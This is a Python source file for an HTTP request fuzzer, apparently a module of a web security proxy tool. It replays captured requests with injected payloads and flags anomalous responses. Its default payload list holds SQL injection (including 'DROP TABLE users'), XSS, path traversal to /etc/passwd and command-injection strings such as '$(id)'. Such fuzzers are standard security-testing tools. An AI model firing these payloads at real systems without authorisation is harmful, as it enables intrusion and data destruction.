from __future__ import annotations
import copy
import dataclasses
import json
import logging
import socket
import ssl
import time
import urllib.parse
from pathlib import Path
from typing import Any
import history
import http_parser
import tls

log = logging.getLogger(__name__)

# We can tune these if we want
LEN_CHANGE_LIMIT = 50 # Min bytes to flag as an anomoly
TIME_LIMIT = 3.0 # Min response time where we flag as a time spike
REQUEST_LIMIT = 10 # Timeout for each fuzz request

ERROR_PATTERNS: list[str] = [
    # SQL errors
    "sql syntax", "mysql_fetch", "ora-", "pg_query", "sqlite_",
    "unclosed quotation", "unterminated string", "odbc_",
    "sqlstate", "syntax error", "division by zero",
    # Stack traces / server errors
    "traceback", "stack trace", "exception in thread",
    "at java.", "system.exception", "unhandled exception",
    "fatal error", "parse error",
    # Path / file disclosure
    "no such file", "permission denied", "include_path",
    "warning: include", "failed to open stream",
    # Generic
    "internal server error", "undefined variable", "undefined index",
]
 
# Headers to fuzz (skip security-sensitive ones that would break the connection)
FUZZABLE_HEADERS = {
    "user-agent", "referer", "x-forwarded-for", "x-real-ip",
    "accept-language", "accept", "origin", "cookie",
}
 
 
# ── payload loader ────────────────────────────────────────────────────────────
 
DEFAULT_PAYLOADS: list[str] = [
    # SQL injection
    "'", "''", "' OR '1'='1", "' OR 1=1--", "\" OR \"1\"=\"1",
    "1; DROP TABLE users--", "1' AND SLEEP(5)--", "1; WAITFOR DELAY '0:0:5'--",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    # XSS
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
    "javascript:alert(1)", "'><svg onload=alert(1)>",
    # Path traversal
    "../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    # Command injection
    "; ls", "| whoami", "`id`", "$(id)", "; sleep 5",
    # Format strings
    "%s%s%s%s", "%n%n%n%n", "{7*7}", "{{7*7}}",
    # Null / boundary
    "\x00", "\r\n", "A" * 1024, "A" * 8192,
]

def loadWordlist(path: str | Path):
    pth = Path(path)
    if not pth.exists():
        raise FileNotFoundError()
    payloads = []
    for line in pth.read_text(encoding="utf-8", errors="replace").splitlines():
        line = line.strip()
        if line and not line.startswith("#"):
            payloads.append(line)
    log.info("Loaded %d payloads from %s", len(payloads), pth)
    return payloads

@dataclasses.dataclass
class InjectionPoint:
    kind: str #query, body form, body json, head, path
    key: str #parameter, header name, path index
    original: str # original value


def findPoints(req: http_parser.HTTPRequest):
    points = []
    parsed = urllib.parse.urlparse(req.path)
    # For queries
    for key, values in urllib.parse.parse_qs(parsed.query, keep_blank_values=True).items():
        points.append(InjectionPoint("query", key, values[0]))

    # For body forms
    contentType = req.headers.get("content-type", "")
    if req.body and "application/x-www-form-urlencoded" in contentType:
        bodyStr = req.body.decode("utf-8", errors="replace")
        for key, values in urllib.parse.parse_qs(bodyStr, keep_blank_values=True).items():
            points.append(InjectionPoint("body_form", key, values[0]))
    
    # For post body jsons
    if req.body and "application/json" in contentType:
        try:
            obj = json.loads(req.body)
            if isinstance(obj, dict):
                for key, value in obj.items():
                    if isinstance(value, (str, int, float, bool)):
                        points.append(InjectionPoint("body_json", key, str(value)))
        except json.JSONDecodeError:
            pass

    #for the fuzzable headers
    for name, value in req.raw_headers:
        if name.lower() in FUZZABLE_HEADERS:
            points.append(InjectionPoint("header", name, value))

    
    #For the URL path segments
    segments = [s for s in parsed.path.split("/") if s]
    for i, seg in enumerate(segments):
        points.append(InjectionPoint("path", str(i), seg))

    return points

def performMutation(req: http_parser.HTTPRequest, point: InjectionPoint, payload: str):
    parsed = urllib.parse.urlparse(req.path)

    if point.kind == "query":
        parameters = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        parameters[point.key] = [payload]
        newQuery = urllib.parse.urlencode(parameters, doseq=True)
        newPath = parsed._replace(query=newQuery).geturl()
        return dataclasses.replace(req, path=newPath)
    if point.kind == "body_form":
        bodyStr = req.body.decode("utf-8", errors="replace")
        parameters = urllib.parse.parse_qs(bodyStr, keep_blank_values=True)
        parameters[point.key] = [payload]
        newBody = urllib.parse.urlencode(parameters, doseq=True).encode()
        newRaw = [(k, str(len(newBody)) if k.lower() == "content-length" else v) for k, v in req.raw_headers]
        return dataclasses.replace(req, body=newBody, raw_headers=newRaw, headers={**req.headers, "content-length": str(len(newBody))})
    if point.kind == "body_json":
        try:
            obj = json.loads(req.body)
            obj[point.key] = payload
            newBody = json.dumps(obj).encode()
            newRaw = [(k, str(len(newBody)) if k.lower() == "content-length" else v) for k, v in req.raw_headers]
            return dataclasses.replace(req, body=newBody, raw_headers=newRaw, headers={**req.headers, "content-length": str(len(newBody))})
        except (json.JSONDecodeError, KeyError):
            return req
    if point.kind == "header":
        newRaw = [(k, payload if k == point.key else v) for k, v in req.raw_headers]
        newHeaders = {**req.headers, point.key.lower(): payload}
        return dataclasses.replace(req, raw_headers=newRaw, headers=newHeaders)
    if point.kind == "path":
        segments = [s for s in parsed.path.split("/") if s]
        idx = int(point.key)
        if idx < len(segments):
            segments[idx] = urllib.parse.quote(payload, safe="")
        newPathStr = "/" + "/".join(segments)
        newPath = parsed._replace(path=newPathStr).geturl()
        return dataclasses.replace(req, path=newPath)

    return req  # fallback — unknown kind, return unchanged

@dataclasses.dataclass
class FuzzResult:
    injectionPoint: str      # e.g. "query:id", "header:user-agent", "path:1"
    payload: str
    baselineStatus: int
    fuzzStatus: int
    baselineLength: int
    fuzzLength: int
    baselineTime: float
    fuzzTime: float
    anomalies: list[str]     # e.g. ["status_change:200→500", "error_strings_found"]
    errorMatches: list[str]  # which ERROR_PATTERNS matched in the body

    @property
    def isAnomalous(self) -> bool:
        return bool(self.anomalies)


def sendRequest(
    req: http_parser.HTTPRequest,
    host: str,
    port: int,
    protocol: str,
) -> tuple[http_parser.HTTPResponse, float]:
    """Send a request and return (response, elapsed_seconds). Raises on failure."""
    raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    raw.settimeout(REQUEST_LIMIT)

    ip = socket.gethostbyname(host)
    raw.connect((ip, port))

    if protocol == "https":
        ctx = tls.make_upstream_context(verify=True)
        sock: Any = ctx.wrap_socket(raw, server_hostname=host)
    else:
        sock = raw

    t0 = time.monotonic()
    sock.sendall(req.to_bytes())
    resp = http_parser.HTTPResponse.from_socket(sock, req.method)
    elapsed = time.monotonic() - t0

    try:
        sock.close()
    except Exception:
        pass

    return resp, elapsed


def checkAnomalies(
    baselineResp: http_parser.HTTPResponse,
    baselineTime: float,
    fuzzResp: http_parser.HTTPResponse,
    fuzzTime: float,
) -> tuple[list[str], list[str]]:
    """Compare baseline vs fuzz response. Returns (anomalies, errorMatches)."""
    anomalies: list[str] = []
    errorMatches: list[str] = []

    # Status code change
    if fuzzResp.status_code != baselineResp.status_code:
        anomalies.append(f"status_change:{baselineResp.status_code}→{fuzzResp.status_code}")

    # Body length change beyond threshold
    baselineLen = len(baselineResp.body or b"")
    fuzzLen = len(fuzzResp.body or b"")
    if abs(fuzzLen - baselineLen) > LEN_CHANGE_LIMIT:
        anomalies.append(f"length_change:{baselineLen}→{fuzzLen}")

    # Error strings in response body
    bodyText = (fuzzResp.body or b"").decode("utf-8", errors="replace").lower()
    for pattern in ERROR_PATTERNS:
        if pattern in bodyText:
            errorMatches.append(pattern)
    if errorMatches:
        anomalies.append("error_strings_found")

    # Response time spike
    if fuzzTime > TIME_LIMIT and fuzzTime > baselineTime * 2:
        anomalies.append(f"time_spike:{baselineTime:.2f}s→{fuzzTime:.2f}s")

    return anomalies, errorMatches

def fuzzRequest(
    req: http_parser.HTTPRequest,
    host: str,
    port: int,
    protocol: str,
    payloads: list[str] | None = None,
) -> list[FuzzResult]:
    """Fuzz every injection point in req with every payload."""
    if payloads is None:
        payloads = DEFAULT_PAYLOADS

    # Fire a baseline request first so we have something to diff against
    log.info("Establishing baseline for %s %s", req.method, req.path)
    try:
        baselineResp, baselineTime = sendRequest(req, host, port, protocol)
    except Exception as exc:
        log.error("Baseline request failed: %s", exc)
        return []

    log.info(
        "Baseline: status=%d  length=%d  time=%.2fs",
        baselineResp.status_code,
        len(baselineResp.body or b""),
        baselineTime,
    )

    points = findPoints(req)
    if not points:
        log.warning("No injection points found in request.")
        return []

    log.info(
        "Fuzzing %d point(s) x %d payload(s) = %d total requests",
        len(points), len(payloads), len(points) * len(payloads),
    )

    results: list[FuzzResult] = []

    for point in points:
        pointLabel = f"{point.kind}:{point.key}"
        for payload in payloads:
            mutated = performMutation(req, point, payload)
            try:
                fuzzResp, fuzzTime = sendRequest(mutated, host, port, protocol)
            except Exception as exc:
                log.debug("Request failed for payload %r at %s: %s", payload, pointLabel, exc)
                continue

            anomalies, errorMatches = checkAnomalies(
                baselineResp, baselineTime, fuzzResp, fuzzTime
            )

            if anomalies:
                results.append(FuzzResult(
                    injectionPoint=pointLabel,
                    payload=payload,
                    baselineStatus=baselineResp.status_code,
                    fuzzStatus=fuzzResp.status_code,
                    baselineLength=len(baselineResp.body or b""),
                    fuzzLength=len(fuzzResp.body or b""),
                    baselineTime=baselineTime,
                    fuzzTime=fuzzTime,
                    anomalies=anomalies,
                    errorMatches=errorMatches,
                ))
                log.warning(
                    "ANOMALY  %s  payload=%r  anomalies=%s",
                    pointLabel, payload[:60], anomalies,
                )

    log.info("Fuzzing complete. %d anomalies found.", len(results))
    return results


def fuzzFlow(flow_id: int, payloads: list[str] | None = None) -> list[FuzzResult]:
    """Pull a captured flow from history.db by id and fuzz it."""
    row = history.getFlow(flow_id)
    if row is None:
        raise ValueError(f"Flow {flow_id} not found in history database.")

    rawHeaders: list[tuple[str, str]] = json.loads(row["req_headers"])
    headers = {k.lower(): v for k, v in rawHeaders}
    req = http_parser.HTTPRequest(
        method=row["req_method"],
        path=row["req_path"],
        version=row["req_version"],
        headers=headers,
        raw_headers=rawHeaders,
        body=row["req_body"] or b"",
    )

    return fuzzRequest(
        req,
        host=row["host"],
        port=row["port"],
        protocol=row["protocol"],
        payloads=payloads,
    )


def printResults(results: list[FuzzResult]) -> None:
    if not results:
        print("[+] No anomalies found.")
        return

    print(f"\n{'='*70}")
    print(f"  FUZZ RESULTS — {len(results)} anomalies found")
    print(f"{'='*70}")

    for i, r in enumerate(results, 1):
        print(f"\n[{i}] Injection point : {r.injectionPoint}")
        print(f"    Payload          : {r.payload[:80]!r}")
        print(f"    Status           : {r.baselineStatus} → {r.fuzzStatus}")
        print(f"    Length           : {r.baselineLength} → {r.fuzzLength} bytes")
        print(f"    Time             : {r.baselineTime:.2f}s → {r.fuzzTime:.2f}s")
        print(f"    Anomalies        : {', '.join(r.anomalies)}")
        if r.errorMatches:
            print(f"    Error patterns   : {', '.join(r.errorMatches)}")

    print(f"\n{'='*70}\n")


if __name__ == "__main__":
    import argparse
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s",
    )
    parser = argparse.ArgumentParser(description="Fuzz a captured flow from history.db")
    parser.add_argument("flow_id", type=int, help="Flow ID to fuzz")
    parser.add_argument("--wordlist", type=str, default=None,
                        help="Path to a newline-separated payload wordlist")
    args = parser.parse_args()

    payloads = loadWordlist(args.wordlist) if args.wordlist else None
    results = fuzzFlow(args.flow_id, payloads=payloads)
    printResults(results)